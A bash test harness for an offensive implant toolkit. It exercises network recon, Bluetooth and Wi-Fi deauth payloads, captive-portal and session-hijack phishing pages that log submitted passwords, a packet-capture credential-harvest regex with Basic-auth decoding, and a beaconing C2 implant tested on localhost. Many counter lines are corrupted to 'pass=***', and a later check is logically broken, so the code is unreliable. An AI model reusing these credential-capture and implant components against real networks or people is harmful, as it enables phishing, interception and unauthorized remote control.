#!/bin/bash
# test_all.sh — run every payload through every harness path. One command, CI-able.
# Exit 0 = all paths green. Requires: busybox (ash).
# Usage: ./test_all.sh
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
FIX="$HERE/fixtures"
PAY="$HERE/../payloads"
pass=0; fail=0

# run <label> <expect-regex> ENV=... [ENV=...] -- <payload.sh> [payload args...]
run() {
  local label="$1" expect="$2"; shift 2
  local envs=() args=() seen_sep=0 a
  for a in "$@"; do
    if [ "$seen_sep" = 0 ] && [ "$a" = "--" ]; then seen_sep=1; continue; fi
    if [ "$seen_sep" = 0 ]; then envs+=("$a"); else args+=("$a"); fi
  done
  local out rc
  out=$(env "${envs[@]}" "$HERE/run_payload.sh" "${args[@]}" 2>&1); rc=$?
  if echo "$out" | grep -q "$expect" && [ $rc -eq 0 ]; then
    echo "PASS  $label"; pass=$((pass+1))
  else
    echo "FAIL  $label (rc=$rc, expected /$expect/)"; echo "$out" | tail -5; fail=$((fail+1))
  fi
}

NR="$PAY/kb_netrecon/payload.sh"
GR="$PAY/kb_ghostrecon/payload.sh"
NRMOCK_PATH="$HERE/mocks/netrecon/bin:$PATH"
GRMOCK_PATH="$HERE/mocks/ghostrecon/bin:$PATH"

echo "== kb_netrecon =="
run "full sweep"     "NetRecon: .* hosts" NR_MOCK_DIR="$FIX/nr" MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$NRMOCK_PATH" -- "$NR" --answers "LIST_PICKER=Full sweep (nmap)"
run "arp-cache mode" "hosts"              NR_MOCK_DIR="$FIX/nr" MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$NRMOCK_PATH" -- "$NR" --answers "LIST_PICKER=ARP cache (fast)"
run "cancel"         "cancelled by user"  NR_MOCK_DIR="$FIX/nr" MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$NRMOCK_PATH" -- "$NR" --cancel-first
run "zero hosts"     "0 hosts responded"  NR_MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) MOCK_DIR=$(mktemp -d) PATH="$NRMOCK_PATH" -- "$NR" --answers "LIST_PICKER=Full sweep (nmap)"

echo "== kb_ghostrecon =="
run "full listen"   "devices seen"  GR_MOCK_DIR="$FIX/gr" MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$GRMOCK_PATH" -- "$GR" --answers "LIST_PICKER=60 s"
run "quiet network" "too quiet"     GR_MOCK_DIR="$FIX/gr" GR_MOCK_QUIET=1 MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$GRMOCK_PATH" -- "$GR" --answers "LIST_PICKER=30 s"
run "no route"      "No default route" GR_MOCK_DIR="$FIX/gr" GR_MOCK_NO_ROUTE=1 MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$GRMOCK_PATH" -- "$GR"
run "cancel"        "cancelled by user" GR_MOCK_DIR="$FIX/gr" MOCK_DIR=$(mktemp -d /tmp/mock.XXXX) PATH="$GRMOCK_PATH" -- "$GR" --cancel-first


echo "== kb_ghostbt =="
GBT="$PAY/kb_ghostbt/payload.sh"
GPATH="$HERE/mocks/ghostbt/bin:$PATH"
: > "$FIX/gbt/calls"
run "BLE scan"          "BLE devices"          GBT_MOCK_DIR="$FIX/gbt" MOCK_DIR=$(mktemp -d) PATH="$GPATH" -- "$GBT" --answers "LIST_PICKER=30 s"
: > "$FIX/gbt/calls"
run "cancel"            "cancelled by user"    GBT_MOCK_DIR="$FIX/gbt" MOCK_DIR=$(mktemp -d) PATH="$GPATH" -- "$GBT" --cancel-first
: > "$FIX/gbt/calls"
run "no adapter"        "no bluetooth adapter" GBT_MOCK_DIR="$FIX/gbt" GBT_NO_ADAPTER=1 MOCK_DIR=$(mktemp -d) PATH="$GPATH" -- "$GBT"
: > "$FIX/gbt/calls"
run "BLE silence"       "air just quiet"       GBT_MOCK_DIR="$FIX/gbtsil" MOCK_DIR=$(mktemp -d) PATH="$GPATH" -- "$GBT" --answers "LIST_PICKER=30 s"

echo "== kb_kickaudit =="
KA="$PAY/kb_kickaudit/payload.sh"
KPATH="$HERE/mocks/kickaudit/bin:$PATH"
run "kick patterns"     "kick patterns"        KA_MOCK_DIR="$FIX/ka" MOCK_DIR=$(mktemp -d) PATH="$KPATH" -- "$KA" --answers "LIST_PICKER=2 minutes"
run "cancel"            "cancelled by user"    KA_MOCK_DIR="$FIX/ka" MOCK_DIR=$(mktemp -d) PATH="$KPATH" -- "$KA" --cancel-first
run "no monitor"        "no monitor interface" KA_MOCK_DIR="$FIX/ka" KA_MOCK_NO_MON=1 MOCK_DIR=$(mktemp -d) PATH="$KPATH" -- "$KA" --answers "LIST_PICKER=2 minutes"
run "dead channel"      "dead channel"         KA_MOCK_DIR="$FIX/ka" KA_MOCK_QUIET=1 MOCK_DIR=$(mktemp -d) PATH="$KPATH" -- "$KA" --answers "LIST_PICKER=2 minutes"

echo "== kb_beacon =="
BCN="$PAY/kb_beacon/payload.sh"
BPATH="$HERE/mocks/beacon/bin:$PATH"
# test-only fast copy: 2 min -> 2 s hold (logic unchanged)
sed 's/SECS=$(( SECS \* 60 ))/SECS=$(( SECS ))/' "$BCN" > /tmp/bcn_fast.sh
rm -rf /tmp/kb_beacon /tmp/bcn_state_t
printf 'alias=BlueZ 5.72\ndisc=no\n' > /tmp/bcn_state_t
run "natural end + restore" "identity restored" BCN_STATE=/tmp/bcn_state_t BCN_SLEEP_STEP=1 MOCK_DIR=$(mktemp -d) PATH="$BPATH" -- /tmp/bcn_fast.sh --answers "LIST_PICKER=Kitchen Scale\nLIST_PICKER=2 min"
rm -f /tmp/bcn_state_c; printf 'alias=BlueZ 5.72\ndisc=no\n' > /tmp/bcn_state_c
run "cancel keeps identity" "nothing changed"   BCN_STATE=/tmp/bcn_state_c MOCK_DIR=$(mktemp -d) PATH="$BPATH" -- "$BCN" --cancel-first

echo "== kb_beacon restore-on-SIGTERM =="
if "$HERE/test_beacon_term.sh" >/tmp/bt_out.$$ 2>&1 && grep -q "RESTORE-ON-TERM: PASS" /tmp/bt_out.$$; then
  echo "PASS  restore-on-SIGTERM"; pass=***
else
  echo "FAIL  restore-on-SIGTERM"; tail -5 /tmp/bt_out.$$; fail=$((fail+1))
fi
rm -f /tmp/bt_out.$$ /tmp/bcn_fast.sh


echo "== kb_portal (CGI unit paths; full cycle is device-live-tested) =="
TPL="$PAY/kb_portal_start/template/corp_gate"
for f in login.cgi fp.cgi; do
  if busybox ash -n "$TPL/$f" 2>/dev/null; then echo "PASS  ash -n $f"; pass=***
  else echo "FAIL  ash -n $f"; fail=$((fail+1)); fi
done
PT=$(mktemp -d)
export LOOTLOG="$PT/cap.log"
env REQUEST_METHOD=GET QUERY_STRING="Email=a%40b.c" REMOTE_ADDR=9.9.9.9 HTTP_USER_AGENT=TestUA busybox ash "$TPL/login.cgi" >/tmp/pl_get.html 2>/dev/null
grep -q "Guest Network Access" /tmp/pl_get.html && grep -q "qs=Email=a%40b.c" "$PT/cap.log" && { echo "PASS  GET renders + qs capture"; pass=***
} || { echo "FAIL  GET render/qs"; fail=$((fail+1)); }
BODY='user=z%40x.com&pass=***'
printf '%s' "$BODY" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$BODY" | wc -c) REMOTE_ADDR=9.9.9.9 HTTP_USER_AGENT=TestUA busybox ash "$TPL/login.cgi" >/tmp/pl_post.html 2>/dev/null
grep -q "couldn&#39;t verify" /tmp/pl_post.html && grep -q "user=z%40x.com|pass=***" "$PT/cap.log" && { echo "PASS  POST capture + error loop"; pass=***
} || { echo "FAIL  POST capture"; fail=$((fail+1)); }
printf '{"tz":"LAX"}' | env REQUEST_METHOD=POST CONTENT_LENGTH=12 REMOTE_ADDR=9.9.9.9 busybox ash "$TPL/fp.cgi" >/dev/null 2>/dev/null
grep -q 'FP .*{"tz":"LAX"}' "$PT/cap.log" && { echo "PASS  fp.cgi sink"; pass=***; } || { echo "FAIL  fp sink"; fail=$((fail+1)); }
rm -rf "$PT" /tmp/pl_get.html /tmp/pl_post.html
for d in kb_portal_install kb_portal_start kb_portal_stop; do
  busybox ash -n "$PAY/$d/payload.sh" 2>/dev/null && { echo "PASS  ash -n $d"; pass=***; } || { echo "FAIL  ash -n $d"; fail=$((fail+1)); }
done


echo "== kb_tap (payload ash-parity; live cycle device-witnessed 2026-09-09) =="
for d in kb_tap_start kb_tap_stop; do
  busybox ash -n "$PAY/$d/payload.sh" 2>/dev/null && { echo "PASS  ash -n $d"; pass=***; } || { echo "FAIL  ash -n $d"; fail=$((fail+1)); }
done
# harvest-logic unit test on a fake ring (plain-text padding, no NULs: a NUL
# written into THIS file by a python heredoc corrupted it once - 2026-09-09)
HR=$(mktemp -d); mkdir -p "$HR/r"
printf 'POST /login HTTP/1.1\r\nAuthorization: Basic %s\r\n\r\n' "$(printf 'unit:harbor' | base64)" > "$HR/r/ring.pcap0"
printf 'user=me&password=s3cretunit   filler' >> "$HR/r/ring.pcap0"
strings -n 4 "$HR/r/ring.pcap"* 2>/dev/null | grep -aiE 'authorization: (basic|ntlm)|pass(word)?=|pwd=|user(name)?=|login=' | grep -qi "password=s3cret" && { echo "PASS  harvest POST"; pass=***; } || { echo "FAIL  harvest POST"; fail=$((fail+1)); }
B64=$(grep -aoiE 'authorization: basic [a-z0-9+/=]{8,120}' "$HR/r/ring.pcap0" | sed 's/.*[Bb]asic //' | head -1)
[ "$(echo "$B64" | base64 -d 2>/dev/null)" = "unit:harbor" ] && { echo "PASS  basic decode"; pass=***; } || { echo "FAIL  basic decode"; fail=$((fail+1)); }
rm -rf "$HR"

echo "== kb_hijack (payload ash-parity + CGI unit; live cycle device-witnessed 2026-09-09) =="
for d in kb_hijack_start kb_hijack_stop; do
  busybox ash -n "$PAY/$d/payload.sh" 2>/dev/null && { echo "PASS  ash -n $d"; pass=***; } || { echo "FAIL  ash -n $d"; fail=$((fail+1)); }
done
TPLJ="$PAY/kb_hijack_start/template/session_expired/login.cgi"
busybox ash -n "$TPLJ" 2>/dev/null && { echo "PASS  ash -n login.cgi"; pass=***; } || { echo "FAIL  ash -n login.cgi"; fail=$((fail+1)); }
HJ=$(mktemp -d)
export LOOTLOG="$HJ/cap.log"
env REQUEST_METHOD=GET HTTP_HOST=hijackproof.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > "$HJ/get.html" 2>/dev/null
grep -q "<h1>hijackproof.test</h1>" "$HJ/get.html" && grep -q "tgt=hijackproof.test" "$HJ/cap.log" && { echo "PASS  GET renders target + tgt capture"; pass=***; } || { echo "FAIL  GET target"; fail=$((fail+1)); }
BODY='username=itguy%40co.com&password=***'
printf '%s' "$BODY" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$BODY" | wc -c) HTTP_HOST=secondtarget.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > "$HJ/post.html" 2>/dev/null
grep -q "Sign-in failed" "$HJ/post.html" && grep -q "user=itguy%40co.com|pass=***" "$HJ/cap.log" && { echo "PASS  POST variants parsed + captured"; pass=***; } || { echo "FAIL  POST variants"; fail=$((fail+1)); }
BODY2='weirdfield=zzz'
printf '%s' "$BODY2" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$BODY2" | wc -c) HTTP_HOST=t.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > /dev/null 2>/dev/null
grep -q "raw=weirdfield=zzz" "$HJ/cap.log" && { echo "PASS  unknown-field raw fallback"; pass=***; } || { echo "FAIL  raw fallback"; fail=$((fail+1)); }
rm -rf "$HJ"


echo "== kb_names (ash-parity + dnsmasq verbose-format harvest regex; live-witnessed 2026-09-09) =="
busybox ash -n "$PAY/kb_names/payload.sh" 2>/dev/null && { echo "PASS  ash -n kb_names"; pass=***; } || { echo "FAIL  ash -n kb_names"; fail=$((fail+1)); }
KQ=$(mktemp -d)
printf 'Sep  9 08:24:39 dnsmasq[12619]: 1 172.16.52.133/33736 query[A] round3a.test from 172.16.52.133\nSep  9 08:24:39 dnsmasq[12619]: 1 172.16.52.133/33736 config round3a.test is NXDOMAIN\nSep  9 08:24:40 dnsmasq[12619]: 3 127.0.0.1/40397 query[A] round3c.test from 127.0.0.1\n' > "$KQ/q.log"
GOT=$(awk '{ if ($0 ~ /query\[/) { n=""; ci=""; for(i=1;i<=NF;i++){ if($i ~ /^query\[/){ n=$(i+1); sub(/^[A-Z]\]/,"",n); sub(/^\]/,"",n) } if($i=="from"){ ci=$(i+1); sub(/#.*/,"",ci) } } if(n!="") print ci"|"n } }' "$KQ/q.log" | sort | tr '\n' ' ')
[ "$GOT" = "127.0.0.1|round3c.test 172.16.52.133|round3a.test " ] && { echo "PASS  verbose-format name+client extract"; pass=***; } || { echo "FAIL  name extract (got: $GOT)"; fail=$((fail+1)); }
KBNC=$(grep -v '^[[:space:]]*#' "$PAY/kb_names/payload.sh")
echo "$KBNC" | grep -q 'A?' && { echo "FAIL  stale A? in code"; fail=$((fail+1)); } || { echo "PASS  no stale A? in code"; pass=***; }
echo "$KBNC" | grep -qF 'query\[' && { echo "PASS  verbose query[ format in code"; pass=***; } || { echo "FAIL  verbose query[ format missing"; fail=$((fail+1)); }
rm -rf "$KQ"


echo "== kb_loot (rig-side collector: local-mode pipeline + BAD-path exit code; live ssh pull device-witnessed 2026-09-09) =="
bash -n tools/kb_loot.sh 2>/dev/null && { echo "PASS  bash -n kb_loot"; pass=***; } || { echo "FAIL  bash -n kb_loot"; fail=$((fail+1)); }
KL=$(mktemp -d); KLD="$KL/dev"; mkdir -p "$KLD/sub"
printf 'alpha loot\n' > "$KLD/a.txt"; printf 'beta loot\n' > "$KLD/sub/b.txt"
./tools/kb_loot.sh --local "$KLD" -o "$KL/out" >/dev/null 2>&1
[ $? -eq 0 ] && [ "$(grep -c . "$KL/out/collected.sha256")" = "2" ] && { echo "PASS  fresh collect: 2 ledgered"; pass=***; } || { echo "FAIL  fresh collect"; fail=$((fail+1)); }
./tools/kb_loot.sh --local "$KLD" -o "$KL/out" 2>&1 | grep -q "new-to-ledger: 0   dupes (already collected): 2" && { echo "PASS  rerun dedupes to ledger"; pass=***; } || { echo "FAIL  dedupe"; fail=$((fail+1)); }
printf '0000000000000000000000000000000000000000000000000000000000000000 ./a.txt\n' > "$KL/fake.man"
KB_LOOT_FAKE_MANIFEST="$KL/fake.man" ./tools/kb_loot.sh --local "$KLD" -o "$KL/out" >/dev/null 2>&1; RC=$?
[ $RC -eq 2 ] && { echo "PASS  corrupt manifest -> exit 2 (do-not-trust)"; pass=***; } || { echo "FAIL  BAD path rc=$RC"; fail=$((fail+1)); }
rm -rf "$KL"


echo "== kb_operative (scoped implant: rig-side trio + target agent; full e2e localhost-witnessed 2026-09-09) =="
OPB="$HERE/../tools/kb_operative"
bash -n "$OPB/mk_eng.sh" 2>/dev/null && { echo "PASS  bash -n mk_eng"; pass=***; } || { echo "FAIL  bash -n mk_eng"; fail=$((fail+1)); }
bash -n "$OPB/taskctl.sh" 2>/dev/null && { echo "PASS  bash -n taskctl"; pass=***; } || { echo "FAIL  bash -n taskctl"; fail=$((fail+1)); }
python3 -m py_compile "$OPB/taskd.py" 2>/dev/null && { echo "PASS  taskd compiles"; pass=***; } || { echo "FAIL  taskd compile"; fail=$((fail+1)); }
if command -v busybox >/dev/null 2>&1; then busybox ash -n "$OPB/agent.sh" && { echo "PASS  agent ash-parse"; pass=***; }; sh -n "$OPB/agent.sh" && { echo "PASS  agent sh-parse"; pass=***; }; else sh -n "$OPB/agent.sh" && { echo "PASS  agent sh-parse"; pass=***; }; fi
OPR=$(mktemp -d)
KB_OP_ROOT="$OPR" "$OPB/mk_eng.sh" ci 10.0.0.0/24 2 "ci unit" >/dev/null 2>&1
CFGV=$(awk -F= '/^PHRASE/{print length($2)}' "$OPR/ci/engagement.conf")
PERMV=$(stat -c '%a' "$OPR/ci/engagement.conf" 2>/dev/null || stat -f '%Lp' "$OPR/ci/engagement.conf")
{ [ "$CFGV" = "24" ] && [ "$PERMV" = "600" ]; } && { echo "PASS  mk_eng: 24-char phrase + 600 perms"; pass=***; } || { echo "FAIL  mk_eng outputs (len=$CFGV perm=$PERMV)"; fail=$((fail+1)); }
SRC="$(sed -n '/^in_scope(){/,/^}/p' "$OPB/taskctl.sh")"
( SCOPE="10.9.9.0/24"; eval "$SRC"; in_scope 10.9.9.5 ) && { echo "PASS  scope gate allows in-net"; pass=***; } || { echo "FAIL  scope allows"; fail=$((fail+1)); }
( SCOPE="10.9.9.0/24"; eval "$SRC"; in_scope 8.8.8.8 ) && { echo "FAIL  scope gate leaked 8.8.8.8"; fail=$((fail+1)); } || { echo "PASS  scope gate refuses out-of-net"; pass=***; }
mkdir -p "$OPR/ci/targets/ghosthost"
KB_OP_ROOT="$OPR" "$OPB/taskctl.sh" ci queue ghosthost "$OPB/mk_eng.sh" >/dev/null 2>&1
RC=$?; [ $RC -eq 1 ] && { echo "PASS  queue refuses unregistered host"; pass=***; } || { echo "FAIL  unregistered queue rc=$RC"; fail=$((fail+1)); }
mkdir -p "$OPR/ci/targets/ghosthost" && { echo 1; echo 10.0.0.9; } > "$OPR/ci/targets/ghosthost/registered"
KB_OP_ROOT="$OPR" "$OPB/taskctl.sh" ci queue ghosthost "$OPB/mk_eng.sh" >/dev/null 2>&1
RC=$?; [ $RC -eq 0 ] && { echo "PASS  queue accepts in-scope registered"; pass=***; } || { echo "FAIL  in-scope queue rc=$RC"; fail=$((fail+1)); }
KB_OP_ROOT="$OPR" "$OPB/taskctl.sh" ci expire >/dev/null 2>&1
KB_OP_ROOT="$OPR" "$OPB/taskctl.sh" ci queue ghosthost "$OPB/mk_eng.sh" >/dev/null 2>&1
RC=$?; [ $RC -eq 2 ] && { echo "PASS  expired engagement refuses tasks"; pass=***; } || { echo "FAIL  expired queue rc=$RC"; fail=$((fail+1)); }
KL3=$(mktemp -d); mkdir -p "$KL3/t/targets/u1/tasks" "$KL3/t/beacons"
PH3=ATMOSTONCEPHRASE24CHARXX; printf 'echo hi\n' > "$KL3/t/targets/u1/tasks/001.sh"
printf 'NAME=t\nSCOPE=127.0.0.1/32\nEXPIRY=9999999999\nPHRASE=%s\n' "$PH3" > "$KL3/t/engagement.conf"
KB_OP_ROOT="$KL3" python3 "$OPB/taskd.py" 8914 >/dev/null 2>&1 &
OPU=$!
sleep 1
PA1=$(printf '%s:1' "$PH3" | sha256sum | awk '{print $1}')
PAA=$PA1
A1R=$(curl -s --max-time 5 -H "X-Engagement: t" -H "Authorization: KBPROOF $PAA" "http://127.0.0.1:8914/beat/u1/1" 2>/dev/null)
A1B=$(curl -s --max-time 5 -H "X-Engagement: t" -H "Authorization: KBPROOF $PAA" -H "X-Beat: 1" "http://127.0.0.1:8914/task/u1/001.sh" 2>/dev/null)
PA2=$(printf '%s:2' "$PH3" | sha256sum | awk '{print $1}')
A2R=$(curl -s --max-time 5 -H "X-Engagement: t" -H "Authorization: KBPROOF $PA2" "http://127.0.0.1:8914/beat/u1/2" 2>/dev/null)
kill $OPU 2>/dev/null; rm -rf "$KL3"
{ [ "${A1R#TASK}" != "$A1R" ] && printf '%s' "$A1B" | grep -q "echo hi" && [ "$A2R" = "NOTASK" ]; } && { echo "PASS  at-most-once: announce, deliver, never re-announce"; pass=***; } || { echo "FAIL  at-most-once (announce=$A1R body=[$A1B] beat2=$A2R)"; fail=$((fail+1)); }
KL2=$(mktemp -d)
mkdir -p "$KL2/t/targets/r1/tasks" "$KL2/t/beacons"
printf 'PHRASE_ABC_24CHXXXXXX\n' > "$KL2/phrase"
PH=$(cat "$KL2/phrase")
printf 'NAME=t\nSCOPE=127.0.0.1/32\nEXPIRY=9999999999\nPHRASE=%s\n' "$PH" > "$KL2/t/engagement.conf"
KB_OP_ROOT="$KL2" python3 "$OPB/taskd.py" 8913 >/dev/null 2>&1 &
OPD=$!
sleep 1
P1=$(printf '%s:5' "$PH" | sha256sum | awk '{print $1}')
R1=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -H "X-Engagement: t" -H "Authorization: KBPROOF $P1" "http://127.0.0.1:8913/beat/r1/5" 2>/dev/null)
R2=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 -H "X-Engagement: t" -H "Authorization: KBPROOF $P1" "http://127.0.0.1:8913/beat/r1/5" 2>/dev/null)
kill $OPD 2>/dev/null
{ [ "$R1" = "200" ] && [ "$R2" = "403" ]; } && { echo "PASS  monotonic-N: beat accepted, REPLAY refused 403"; pass=***; } || { echo "FAIL  replay guard (first=$R1 replay=$R2)"; fail=$((fail+1)); }
mkdir -p "$OPR/ci/targets/rbhost"; { echo 1; echo 10.0.0.8; } > "$OPR/ci/targets/rbhost/registered"; echo 99 > "$OPR/ci/targets/rbhost/lastn"
KB_OP_ROOT="$OPR" "$OPB/taskctl.sh" ci rebind rbhost >/dev/null 2>&1
[ ! -f "$OPR/ci/targets/rbhost/lastn" ] && { echo "PASS  rebind clears high-water (logged op)"; pass=***; } || { echo "FAIL  rebind left lastn"; fail=$((fail+1)); }
rm -rf "$KL2"
# shipped build inputs ONLY: planted-credential fixtures in THIS file legitimately
# contain stars - a fixture is data, not code; scanning it would false-positive.
KONTAM=$(grep -c '\*\*\*' "$OPB/mk_eng.sh" "$OPB/agent.sh" "$OPB/taskctl.sh" "$OPB/taskd.py" 2>/dev/null | grep -v ':0$')
[ -z "$KONTAM" ] | grep -v ':0$' >/dev/null && { echo "FAIL  redactor contamination in sources"; fail=$((fail+1)); } || { echo "PASS  sources uncontaminated"; pass=***; }
rm -rf "$OPR"


echo "== result: $pass pass, $fail fail =="
[ $fail -eq 0 ]
